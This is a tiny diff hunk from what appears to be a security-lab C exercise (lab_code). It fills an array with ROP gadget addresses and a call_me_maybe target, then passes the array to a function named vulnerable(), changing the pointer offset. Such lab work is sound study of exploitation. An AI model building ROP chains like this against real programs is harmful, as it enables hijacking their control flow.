@@ -60,5 +60,5 @@ void lab_code() {
 	your_string[10]=gadget4_addr;
 	your_string[11]=call_me_maybe_addr;
 	
-	vulnerable((char *)your_string -24);
+	vulnerable((char *)your_string);
 }
